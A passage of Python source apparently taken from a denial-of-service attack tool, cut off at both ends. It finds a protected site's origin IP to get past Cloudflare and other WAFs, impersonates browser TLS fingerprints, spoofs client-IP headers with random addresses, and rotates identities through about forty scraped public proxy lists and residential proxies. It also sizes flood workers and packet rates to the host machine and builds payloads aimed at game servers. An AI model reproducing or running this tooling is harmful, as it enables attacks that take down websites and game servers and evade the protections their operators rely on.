                    out.append(waf)
            return out if out else None
        except Exception:
            return None
    @staticmethod
    def is_ip_in_waf_range(ip):
        try:
            addr = ipaddress.ip_address(ip)
            for cidr in ALL_WAF_CIDRS + ALL_IRANIAN_CIDRS:
                try:
                    if addr in ipaddress.ip_network(cidr, strict=False):
                        return True
                except Exception: continue
        except Exception: pass
        return False
    @staticmethod
    def is_litespeed(url):
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            r = requests.get(url, timeout=10, headers={"User-Agent": FastUAGenerator().random()}, verify=False)
            return "litespeed" in r.headers.get("Server", "").lower() or "lsws" in r.headers.get("Server", "").lower()
        except Exception:
            return False

# ============================================================================
# CDN Detector
# ============================================================================
class CDNDetector:
    @staticmethod
    def detect(url):
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            r = requests.get(url, timeout=10, headers={"User-Agent": FastUAGenerator().random()}, verify=False)
            server = r.headers.get("Server", "").lower()
            via = r.headers.get("Via", "").lower()
            cf_ray = "cf-ray" in {k.lower() for k in r.headers}
            x_cache = "x-cache" in {k.lower() for k in r.headers}
            if cf_ray or "cloudflare" in server or "akamai" in server or "fastly" in server:
                return True
            if "cdn" in server or "cdn" in via: return True
            if x_cache: return True
            return False
        except Exception:
            return False

# ============================================================================
# OriginIPFinder — v65.1 با Apache-first priority
# ============================================================================
class OriginIPFinder:
    def __init__(self, domain, shodan_api_key=None, securitytrails_api_key=None,
                 censys_api_id=None, censys_api_secret=None, virustotal_api_key=None):
        self.domain = domain
        self.candidates = set()
        self.shodan_api_key = shodan_api_key
        self.securitytrails_api_key = securitytrails_api_key
        self.censys_api_id = censys_api_id
        self.censys_api_secret = censys_api_secret
        self.virustotal_api_key = virustotal_api_key

    def _crt_sh(self):
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=20,
                             headers={"User-Agent": FastUAGenerator().random()})
            if r.status_code != 200: return
            data = r.json()
            subs = set()
            for entry in data:
                for line in entry.get("name_value", "").split("\n"):
                    line = line.strip().lower()
                    if line and "*" not in line: subs.add(line)
            for sub in subs: self._resolve(sub)
            logger.info(f"   [crt.sh] found {len(subs)} subdomains")
        except Exception as e:
            logger.warning(f"   [crt.sh] failed: {e}")

    def _certspotter(self):
        try:
            r = requests.get(f"https://api.certspotter.com/v1/issuances?domain={self.domain}&include_subdomains=true&expand=dns_names",
                             timeout=20, headers={"User-Agent": FastUAGenerator().random()})
            if r.status_code == 200:
                data = r.json()
                for entry in data:
                    for dns in entry.get("dns_names", []): self._resolve(dns)
                logger.info(f"   [certspotter] found {len(data)} issuances")
        except Exception: pass

    def _anubisdb(self):
        try:
            r = requests.get(f"https://jldc.me/anubis/subdomains/{self.domain}", timeout=20)
            if r.status_code == 200:
                subs = r.json()
                for sub in subs: self._resolve(sub)
                logger.info(f"   [anubisdb] found {len(subs)} subdomains")
        except Exception: pass

    def _rapiddns(self):
        try:
            r = requests.get(f"https://rapiddns.io/subdomain/{self.domain}?full=1", timeout=20)
            if r.status_code == 200:
                ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r.text)
                for ip in ips:
                    if not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [rapiddns] found {len(ips)} IPs")
        except Exception: pass

    def _threatminer(self):
        try:
            r = requests.get(f"https://api.threatminer.org/v2/domain.php?q={self.domain}&rt=2", timeout=20)
            if r.status_code == 200:
                data = r.json()
                if data.get("results"):
                    for sub in data["results"]: self._resolve(sub)
                    logger.info(f"   [threatminer] found {len(data['results'])} subdomains")
        except Exception: pass

    def _urlscan(self):
        try:
            r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}&size=100", timeout=20)
            if r.status_code == 200:
                data = r.json()
                for entry in data.get("results", []):
                    ip = entry.get("page", {}).get("ip")
                    if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [urlscan] found {len(data.get('results', []))} results")
        except Exception: pass

    def _wayback_cdx(self):
        try:
            r = requests.get(f"http://web.archive.org/cdx/search/cdx?url=*.{self.domain}/*&output=json&limit=5000&fl=original",
                             timeout=30, headers={"User-Agent": FastUAGenerator().random()})
            if r.status_code == 200:
                data = r.json()
                urls = [row[0] for row in data[1:]] if len(data) > 1 else []
                subs = set()
                for u in urls:
                    try:
                        host = urlparse(u).hostname
                        if host and self.domain in host: subs.add(host)
                    except Exception: continue
                for sub in subs: self._resolve(sub)
                logger.info(f"   [wayback] found {len(subs)} unique hosts")
        except Exception: pass

    def _hackertarget(self):
        try:
            r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={self.domain}", timeout=20)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if "," in line:
                        _, ip = line.split(",", 1)
                        ip = ip.strip()
                        if not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info("   [hackertarget] found subdomains")
        except Exception: pass

    def _otx(self):
        try:
            r = requests.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns", timeout=15)
            if r.status_code == 200:
                for rec in r.json().get("passive_dns", []):
                    ip = rec.get("address")
                    if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [otx] found passive DNS records")
        except Exception: pass

    def _subdomain_enum(self):
        found = 0
        for sub in COMMON_SUBDOMAINS:
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                if not WAFDetector.is_ip_in_waf_range(ip):
                    self.candidates.add(ip); found += 1
            except Exception: continue
        logger.info(f"   [subdomain] found {found} non-WAF IPs")

    def _resolve(self, fqdn):
        try:
            ip = socket.gethostbyname(fqdn)
            if not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
        except Exception: pass

    def _shodan(self):
        try:
            import mmh3, codecs
            r = requests.get(f"https://{self.domain}/favicon.ico", timeout=10, verify=False)
            if r.status_code == 200:
                favicon = codecs.encode(r.content, "base64")
                favicon_hash = mmh3.hash(favicon)
                logger.info(f"   [shodan] favicon hash: {favicon_hash}")
                if self.shodan_api_key:
                    sr = requests.get(f"https://api.shodan.io/shodan/host/search?key={self.shodan_api_key}&query=http.favicon.hash:{favicon_hash}", timeout=15)
                    if sr.status_code == 200:
                        for match in sr.json().get("matches", []):
                            ip = match.get("ip_str")
                            if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                        logger.info(f"   [shodan] found {len(sr.json().get('matches', []))} matches")
        except Exception as e:
            logger.warning(f"   [shodan] failed: {e}")

    def _securitytrails(self):
        if not self.securitytrails_api_key: return
        try:
            r = requests.get(f"https://api.securitytrails.com/v1/history/{self.domain}/dns/a",
                             timeout=20, headers={"APIKEY": self.securitytrails_api_key})
            if r.status_code == 200:
                for rec in r.json().get("records", []):
                    for val in rec.get("values", []):
                        ip = val.get("ip")
                        if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [securitytrails] found DNS history")
        except Exception: pass

    def _censys(self):
        if not self.censys_api_id or not self.censys_api_secret: return
        try:
            import base64 as b64
            auth = b64.b64encode(f"{self.censys_api_id}:{self.censys_api_secret}".encode()).decode()
            r = requests.get(f"https://search.censys.io/api/v2/hosts/search?q={self.domain}",
                             timeout=20, headers={"Authorization": f"Basic {auth}"})
            if r.status_code == 200:
                for hit in r.json().get("result", {}).get("hits", []):
                    ip = hit.get("ip")
                    if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [censys] found hosts")
        except Exception: pass

    def _virustotal(self):
        if not self.virustotal_api_key: return
        try:
            r = requests.get(f"https://www.virustotal.com/api/v3/domains/{self.domain}/resolutions",
                             timeout=20, headers={"x-apikey": self.virustotal_api_key})
            if r.status_code == 200:
                for item in r.json().get("data", []):
                    ip = item.get("attributes", {}).get("ip_address")
                    if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [virustotal] found resolutions")
        except Exception: pass

    def _viewdns(self):
        try:
            r = requests.get(f"https://api.viewdns.info/iphistory/?domain={self.domain}&apikey=free&output=json", timeout=20)
            if r.status_code == 200:
                for rec in r.json().get("response", {}).get("records", []):
                    ip = rec.get("ip")
                    if ip and not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
                logger.info(f"   [viewdns] found IP history")
        except Exception: pass

    def _spf_extract(self):
        try:
            import dns.resolver
            for rdata in dns.resolver.resolve(self.domain, "TXT"):
                for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', str(rdata)):
                    if not WAFDetector.is_ip_in_waf_range(ip): self.candidates.add(ip)
            logger.info(f"   [spf] extracted from TXT records")
        except ImportError: pass
        except Exception: pass

    def _verify(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        verified = []
        for ip in tqdm(self.candidates, desc="Verifying origin IPs", leave=False):
            for scheme in ["https", "http"]:
                for port in [443, 80, 8443, 8080]:
                    try:
                        if CURL_CFFI_AVAILABLE:
                            fp = get_extra_fp_dict("chrome136")
                            kwargs = {"impersonate": "chrome136"}
                            if fp: kwargs["extra_fp"] = fp
                            s = curl_requests.Session(**kwargs)
                            try:
                                s.curl.setopt(CurlOpt.RESOLVE, [f"{self.domain}:{port}:{ip}"])
                                s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0)
                                s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
                            except Exception: pass
                            r = s.get(f"{scheme}://{self.domain}:{port}/",
                                      headers={"User-Agent": FastUAGenerator().random()},
                                      timeout=5, verify=False, allow_redirects=False)
                            if r.status_code in [200, 301, 302, 400, 403, 404, 444]:
                                verified.append({"ip": ip, "port": port, "scheme": scheme,
                                                 "status": r.status_code,
                                                 "server": r.headers.get("Server", "Unknown")})
                                break
                        else:
                            r = requests.get(f"{scheme}://{ip}:{port}/",
                                             headers={"Host": self.domain, "User-Agent": FastUAGenerator().random()},
                                             timeout=3, verify=False, allow_redirects=False)
                            if r.status_code in [200, 301, 302, 400, 403, 404, 444]:
                                verified.append({"ip": ip, "port": port, "scheme": scheme,
                                                 "status": r.status_code,
                                                 "server": r.headers.get("Server", "Unknown")})
                                break
                    except Exception: continue
        return verified

    def find(self):
        logger.info(f"Origin IP discovery for: {self.domain}")
        logger.info("   [1/16] crt.sh ..."); self._crt_sh()
        logger.info("   [2/16] Certspotter ..."); self._certspotter()
        logger.info("   [3/16] AnubisDB ..."); self._anubisdb()
        logger.info("   [4/16] RapidDNS ..."); self._rapiddns()
        logger.info("   [5/16] ThreatMiner ..."); self._threatminer()
        logger.info("   [6/16] URLScan.io ..."); self._urlscan()
        logger.info("   [7/16] Wayback CDX ..."); self._wayback_cdx()
        logger.info("   [8/16] HackerTarget ..."); self._hackertarget()
        logger.info("   [9/16] AlienVault OTX ..."); self._otx()
        logger.info("   [10/16] Subdomain enum ..."); self._subdomain_enum()
        logger.info("   [11/16] Shodan ..."); self._shodan()
        logger.info("   [12/16] SecurityTrails ..."); self._securitytrails()
        logger.info("   [13/16] Censys ..."); self._censys()
        logger.info("   [14/16] VirusTotal ..."); self._virustotal()
        logger.info("   [15/16] ViewDNS ..."); self._viewdns()
        logger.info("   [16/16] SPF/TXT extract ..."); self._spf_extract()
        logger.info(f"   Total candidates: {len(self.candidates)}")
        if not self.candidates: return []
        verified = self._verify()
        logger.info(f"   Verified origin IPs: {len(verified)}")
        for v in verified:
            logger.info(f"      -> {v['scheme']}://{v['ip']}:{v['port']} [{v['status']}] ({v['server']})")
        # v65.1: Apache-first priority, then Nginx, then Unknown, then LiteSpeed
        def priority(v):
            srv = (v.get("server") or "").lower()
            if "apache" in srv: return 0
            if "nginx" in srv: return 1
            if "litespeed" in srv or "lsws" in srv: return 3
            return 2  # Unknown in middle
        verified.sort(key=priority)
        return verified

# ============================================================================
# CloudflareBypassLayer
# ============================================================================
class CloudflareBypassLayer:
    def __init__(self, target_url, original_host=None, proxy_mgr=None):
        self.target_url = target_url
        self.cached_cookies = None
        self.cached_headers = None
    async def bootstrap(self):
        if CURL_CFFI_AVAILABLE:
            try:
                fp = get_extra_fp_dict("chrome136")
                kwargs = {"impersonate": "chrome136"}
                if fp: kwargs["extra_fp"] = fp
                session = curl_requests.Session(**kwargs)
                try: session.curl.setopt(CurlOpt.HTTP2_PSEUDO_HEADERS_ORDER, "masp")
                except Exception: pass
                r = session.get(self.target_url, timeout=15, verify=False, allow_redirects=True)
                if r.status_code == 200:
                    self.cached_cookies = session.cookies.get_dict()
                    self.cached_headers = dict(session.headers)
                    return True
            except Exception: pass
        return False

# ============================================================================
# BrowserSessionHarvester
# ============================================================================
async def harvest_with_curl_cffi(target_url, timeout=15):
    if not CURL_CFFI_AVAILABLE:
        return {"ok": False, "error": "no_curl_cffi", "cookies": [], "headers": {}}
    try:
        fp = get_extra_fp_dict("chrome136")
        kwargs = {"impersonate": "chrome136"}
        if fp: kwargs["extra_fp"] = fp
        s = curl_requests.Session(**kwargs)
        try: s.curl.setopt(CurlOpt.HTTP2_PSEUDO_HEADERS_ORDER, "masp")
        except Exception: pass
        r = s.get(target_url, timeout=timeout, verify=False, allow_redirects=True)
        cookies = s.cookies.get_dict()
        return {"ok": True, "cookies": [{"name": k, "value": v} for k, v in cookies.items()],
                "headers": dict(r.headers), "status": r.status_code, "ua": "chrome136"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:80], "cookies": [], "headers": {}}

class BrowserSessionHarvester:
    def __init__(self, target_url, timeout=30, headless=True):
        self.target_url = target_url; self.timeout = timeout; self.headless = headless
        self.cookies = []; self.headers = {}; self.user_agent = None
    async def harvest(self):
        if not PLAYWRIGHT_AVAILABLE:
            logger.warning("   [harvest] Playwright not available"); return False
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=self.headless,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox",
                          "--disable-dev-shm-usage", "--disable-gpu", "--disable-http2"])
                context = await browser.new_context(user_agent=FastUAGenerator().chrome_desktop(),
                    viewport={"width": 1920, "height": 1080}, locale="en-US",
                    timezone_id="America/New_York", ignore_https_errors=True)
                page = await context.new_page()
                try:
                    await page.goto(self.target_url, wait_until="domcontentloaded", timeout=self.timeout * 1000)
                    cookies = await context.cookies()
                    self.cookies = cookies
                    self.user_agent = await page.evaluate("navigator.userAgent")
                    self.headers = {"User-Agent": self.user_agent}
                    logger.info(f"   [harvest/pw] got {len(cookies)} cookies")
                    return True
                finally: await browser.close()
        except Exception as e:
            logger.warning(f"   [harvest/pw] failed: {str(e)[:80]}"); return False

def _run_harvest_in_proactor_thread(target_url, timeout=30):
    result = {"ok": False, "cookies": [], "headers": {}, "ua": None}
    def _worker():
        import asyncio as _aio
        if IS_WINDOWS: loop = _aio.ProactorEventLoop()
        else: loop = _aio.new_event_loop()
        _aio.set_event_loop(loop)
        try:
            harvester = BrowserSessionHarvester(target_url, timeout=timeout)
            ok = loop.run_until_complete(harvester.harvest())
            result.update({"ok": ok, "cookies": harvester.cookies,
                           "headers": harvester.headers, "ua": harvester.user_agent})
        finally:
            try: loop.close()
            except Exception: pass
    t = threading.Thread(target=_worker, daemon=True); t.start(); t.join(timeout=timeout + 10)
    return result

# ============================================================================
# IdentityRotator
# ============================================================================
class IdentityRotator:
    def __init__(self, rotate_every=1):
        self.rotate_every = rotate_every
        self.ua_gen = FastUAGenerator()
        self.identity_gen = PerRequestIdentity(self.ua_gen)
        self.counter = 0; self.lock = threading.Lock()
        self.current_identity = None
    def get_identity(self, original_host=None):
        with self.lock:
            self.counter += 1
            if self.counter % self.rotate_every == 0 or self.current_identity is None:
                self.current_identity = self.identity_gen.generate(original_host)
            return self.current_identity
    def get_ua(self):
        with self.lock: return self.ua_gen.random()
    def get_impersonate(self):
        return random.choice(CURL_IMPERSONATE)

# ============================================================================
# HeaderManager — v65.1
# ============================================================================
class HeaderManager:
    def __init__(self):
        self.referers = REFERER_PREFIXES
    def get_headers(self, ua, target_url=None, method="GET", proxy_ip=None,
                    spoof_ip=None, browser_headers=None, original_host=None, do_random_order=True):
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "DNT": "1",
        }
        headers["User-Agent"] = ua
        fake_ip = spoof_ip or self._rand_ip()
        chain = fake_ip
        for _ in range(random.randint(0, 2)): chain += f", {self._rand_ip()}"
        headers["X-Forwarded-For"] = chain
        headers["X-Real-IP"] = fake_ip
        headers["X-Client-IP"] = fake_ip
        headers["True-Client-IP"] = fake_ip
        headers["CF-Connecting-IP"] = fake_ip
        headers["Forwarded"] = f"for={fake_ip};proto=https"
        cookie_parts = []
        for name in random.sample(COOKIE_NAMES, k=random.randint(1, 3)):
            cookie_parts.append(f"{name}={os.urandom(random.randint(8, 24)).hex()}")
        headers["Cookie"] = "; ".join(cookie_parts)
        if browser_headers:
            for k, v in browser_headers.items(): headers[k.lower()] = v
        if original_host: headers["Host"] = original_host
        if do_random_order and "Chrome" in ua:
            ordered = {}
            for key in CHROME_HEADER_ORDER:
                if key in headers: ordered[key] = headers[key]
            for key in headers:
                if key not in ordered: ordered[key] = headers[key]
            return ordered
        return headers
    def _rand_ip(self):
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# ============================================================================
# ProxyManager — v65.1
# ============================================================================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/all.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx222/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/alexilario/ProxyList/main/proxy-list.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/proxy_list.txt",
    "https://raw.githubusercontent.com/secure-ur-software/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/proxyspace/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
]

RESIDENTIAL_PROXY_SOURCES = {
    "brightdata": {"url": "brd.superproxy.io:22225"},
    "oxylabs": {"url": "pr.oxylabs.io:7777"},
    "smartproxy": {"url": "gate.smartproxy.com:7000"},
    "iproyal": {"url": "geo.iproyal.com:12321"},
}

def parse_proxy(line):
    line = line.strip()
    if not line: return None
    if "://" in line:
        p = urlparse(line); ptype = p.scheme; netloc = p.netloc
    else:
        if ":" not in line: return None
        ptype = "http"; netloc = line
    if ":" not in netloc: return None
    ip, port = netloc.rsplit(":", 1)
    if not port.isdigit(): return None
    proxy_type_map = {'http': 'http', 'https': 'http', 'socks5': 'socks5',
                      'socks4': 'socks4', 'socks4a': 'socks4', 'socks': 'socks5'}
    return {"ip": ip, "port": int(port), "type": proxy_type_map.get(ptype, 'http')}

def fetch_proxies():
    out = []
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=15, headers={"User-Agent": FastUAGenerator().random()})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    p = parse_proxy(line)
                    if p: out.append(p)
        except Exception: continue
    return out

def test_proxy_dns(proxy, timeout=1.5):
    try:
        start = time.perf_counter()
        proxy_type = pysocks.SOCKS5 if proxy["type"] == "socks5" else pysocks.SOCKS4 if proxy["type"] == "socks4" else None
        if proxy_type is not None and PYSOCKS_AVAILABLE:
            for dns_ip, dns_port in DNS_TARGETS:
                try:
                    s = pysocks.socksocket(); s.set_proxy(proxy_type, proxy["ip"], proxy["port"])
                    s.settimeout(timeout); s.connect((dns_ip, dns_port)); s.close()
                    return proxy, (time.perf_counter() - start) * 1000, True
                except Exception: continue
            return proxy, 9999, False
        else:
            for dns_ip, dns_port in DNS_TARGETS:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout); sock.connect((proxy['ip'], proxy['port'])); sock.close()
                    return proxy, (time.perf_counter() - start) * 1000, True
                except Exception: continue
            return proxy, 9999, False
    except Exception:
        return proxy, 9999, False

def test_proxies_batch(proxies, max_workers=500):
    if not proxies: return []
    alive = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_proxy_dns, p): p for p in proxies}
        for future in as_completed(futures):
            try:
                proxy, latency, ok = future.result()
                if ok and latency < 2000:
                    proxy['latency'] = latency; alive.append(proxy)
            except Exception: continue
    alive.sort(key=lambda x: x.get('latency', 9999))
    return alive

class ProxyManager:
    def __init__(self, mode="waitout", proxy_file=None, max_proxies=10000):
        self.mode = mode; self.max = max_proxies
        self.proxies = []; self.lock = threading.Lock()
        self.residential = None; self._rr_index = 0
    async def load(self):
        if self.mode == "none": return 0
        if self.residential:
            with self.lock: self.proxies = [self.residential] * 500
            return 500
        loop = asyncio.get_running_loop()
        raw = await loop.run_in_executor(None, fetch_proxies)
        if not raw: return 0
        logger.info(f"   Testing {len(raw)} proxies via DNS targets...")
        alive = await loop.run_in_executor(None, test_proxies_batch, raw[:2000], 500)
        logger.info(f"   {len(alive)} proxies alive after DNS test")
        if not alive: return 0
        with self.lock: self.proxies = alive[:self.max]
        return len(self.proxies)
    def set_residential(self, provider="brightdata", user=None, password=None):
        if provider in RESIDENTIAL_PROXY_SOURCES:
            host, port = RESIDENTIAL_PROXY_SOURCES[provider]["url"].split(":")
            self.residential = {"ip": host, "port": int(port), "type": "http",
                                "auth": (user or "user", password or "pass")}
    def get(self):
        with self.lock:
            if not self.proxies: return None
            self._rr_index = (self._rr_index + 1) % len(self.proxies)
            return self.proxies[self._rr_index]
    def count(self):
        with self.lock: return len(self.proxies)
    def mark_dead(self, proxy):
        with self.lock:
            try: self.proxies.remove(proxy)
            except ValueError: pass

# ============================================================================
# SystemAnalyzer
# ============================================================================
class SystemAnalyzer:
    def __init__(self):
        self.level_names = {0: "کاملاً ذغالی 💀", 1: "ذغالی 🤡", 2: "ضعیف 🥱", 3: "بد 😴",
                            4: "معمولی 😐", 5: "خوب 👍", 6: "قوی 💪", 7: "الترا قوی ⚡",
                            8: "فوق‌العاده 🚀", 9: "افسانه‌ای 🔥"}
    async def analyze(self):
        logger.info("Auto-calibrating (30s)...")
        try:
            cc = psutil.cpu_count(logical=True)
            rt = psutil.virtual_memory().total / (1024 ** 3)
            cp = []; ra = []
            psutil.cpu_percent(interval=None)
            await asyncio.sleep(1.0)
            for _ in range(30):
                cp.append(psutil.cpu_percent(interval=None))
                ra.append(psutil.virtual_memory().available / (1024 ** 3))
                await asyncio.sleep(1.0)
            ac = sum(cp) / len(cp); ar = sum(ra) / len(ra); ru = rt - ar
            cf = 1 + (0.5 - ac / 100); rf = 1 + (0.5 - ru / rt) if rt > 0 else 1
            score = (min(100, (cc * 8) * cf) * 0.7) + (min(100, (rt * 8) * rf) * 0.3)
            level = next((i for i, t in enumerate([15, 25, 35, 45, 55, 65, 75, 85, 95]) if score < t), 9)
            logger.info(f"   Calibration: CPU {ac:.1f}%, RAM {ru:.1f}GB, Level {level} - {self.level_names[level]}")
            try:
                for iface, stat in psutil.net_if_stats().items():
                    if stat.isup and stat.speed > 0:
                        logger.info(f"   [net] {iface}: {stat.speed} Mbps"); break
            except Exception: pass
            return {"level": level, "level_name": self.level_names[level], "cpu_cores": cc, "ram_gb": round(rt, 1),
                    "workers": min(5000, [10, 25, 50, 100, 200, 400, 800, 1600, 3200, 6400][level] * max(1, cc // 2)),
                    "connections": min(8000, [50, 100, 200, 400, 800, 1600, 3200, 6400, 12800, 25600][level]),
                    "packet_rate": [100, 300, 500, 800, 1200, 2000, 3000, 5000, 8000, 12000][level]}
        except Exception as e:
            logger.error(f"Calibration failed: {e}")
            return {"level": 4, "level_name": "معمولی 😐", "workers": 200, "connections": 800, "packet_rate": 1200}

# ============================================================================
# PortScanner / TargetAnalyzer
# ============================================================================
class PortScanner:
    @staticmethod
    async def scan(host, ports=None, timeout=2):
        if ports is None: ports = [80, 443, 8080, 8443]
        results = await asyncio.gather(*[PortScanner._check(host, p, timeout) for p in ports])
        return [p for p, ok in results if ok]
    @staticmethod
    async def _check(host, port, timeout):
        try:
            _, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
            w.close(); await w.wait_closed()
            return port, True
        except Exception: return port, False

class TargetAnalyzer:
    @staticmethod
    async def analyze(url):
        url = sanitize_url(url)
        logger.info(f"Analyzing: {url}")
        parsed = urlparse(url)
        host = parsed.hostname; scheme = parsed.scheme or "https"
        original_host = host; open_ports = []
        if parsed.port: port = parsed.port
        else:
            open_ports = await PortScanner.scan(host)
            if open_ports: logger.info(f"   Open ports: {open_ports}")
            port = 443 if scheme == "https" else 80
        if scheme == "https" and port == 80: port = 443
        if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
            final = f"{scheme}://{host}"
        else: final = f"{scheme}://{host}:{port}"
        logger.info(f"   Scheme: {scheme}, Port: {port}")
        logger.info(f"   Target: {final}")
        return {"host": host, "port": port, "target": final, "scheme": scheme,
                "original_host": original_host, "open_ports": open_ports}

# ============================================================================
# RawSocketManager
# ============================================================================
class RawSocketManager:
    @staticmethod
    def is_privileged():
        if IS_WINDOWS:
            try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception: return False
        return os.geteuid() == 0

# ============================================================================
# TargetPrompt
# ============================================================================
class TargetPrompt:
    @staticmethod
    def ask():
        while True:
            try:
                t = safe_input(Fore.CYAN + "Enter target URL: " + Style.RESET_ALL).strip()
            except (EOFError, KeyboardInterrupt):
                print(); continue
            if not t: continue
            t = sanitize_url(t)
            if not t.startswith(("http://", "https://")): t = "https://" + t
            try:
                p = urlparse(t)
                if not p.hostname: continue
                socket.gethostbyname(p.hostname)
            except Exception:
                print(Fore.YELLOW + f"Cannot resolve {t}" + Style.RESET_ALL); continue
            return t

# ============================================================================
# Game Protocol Payloads — v65.1
# ============================================================================
class GamePayloads:
    @staticmethod
    def varint(value):
        result = b""
        while True:
            byte = value & 0x7F; value >>= 7
            if value: byte |= 0x80
            result += bytes([byte])
            if not value: break
        return result
    @staticmethod
    def minecraft_handshake(host, port, protocol=759):
        host_b = host.encode()
        packet = (b"\x00" + GamePayloads.varint(protocol) + GamePayloads.varint(len(host_b)) + host_b +
                  struct.pack(">H", port) + b"\x01")
        return GamePayloads.varint(len(packet)) + packet
    @staticmethod
    def minecraft_ping(): return b"\x01\x00"
    @staticmethod
    def fivem_getinfo(): return b"\xff\xff\xff\xffgetinfo xxx"
    @staticmethod
    def fivem_getinfo_token(token): return b"\xff\xff\xff\xffgetinfo " + token.encode()
    @staticmethod
    def ts3_ping(): return b"TS3INIT1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    @staticmethod
    def vse_ping(): return b"\xff\xff\xff\xffTSource Engine Query\x00"
    @staticmethod
    def mcpe_ping():
